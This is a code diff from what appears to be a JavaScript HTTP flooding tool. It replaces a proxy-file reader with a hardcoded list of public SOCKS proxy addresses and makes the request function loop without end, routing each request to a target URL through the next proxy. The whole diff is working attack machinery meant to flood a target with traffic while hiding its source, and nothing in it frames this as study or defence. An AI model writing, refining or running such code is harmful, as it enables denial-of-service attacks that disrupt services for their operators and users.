@@ -396,25 +396,36 @@ sendRequest(target, agent);
 });
 }
 
-function sendRequests() {
-const proxyList = readProxyList();
-let currentIndex = 0;
+let usingProxy = true 
+async function sendRequests() {
+	//const proxyList = await readProxyList();
+	const proxyList = [
+	  '31.170.22.127:1080',
+	  '45.138.87.238:1080',
+	  '117.250.3.58:8080',
+	  '94.23.220.136:38179',
+	  '162.55.87.48:5566',
+	  '51.89.173.40:9111',
+	  '103.82.22.155:55124'
+	 ]
+	let currentIndex = 0;
 
-function sendRequestUsingNextProxy() {
-if (currentIndex < proxyList.length) {
- const proxyUrl = proxyList[currentIndex];
- let agent;
- if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
- agent = new SocksProxyAgent(proxyUrl);
- } else if (proxyUrl.startsWith('https')) {
- agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) });
- }
- sendRequest(targetUrl, agent);
- currentIndex++;
- setImmediate(sendRequestUsingNextProxy);
-} else {
-sendRequests;
-}
+	function sendRequestUsingNextProxy() {
+		if (currentIndex < proxyList.length) {
+			const proxyUrl = proxyList[currentIndex];
+			let agent
+			
+			if(usingProxy) agent = new SocksProxyAgent('socks5://'+proxyUrl)
+
+			sendRequest(targetUrl, agent);
+			currentIndex++;
+			setImmediate(sendRequestUsingNextProxy);
+		} else {
+			sendRequests();
+		}
+	}
+
+	sendRequestUsingNextProxy();
 }
 console.log(`
 [!] Information [!]
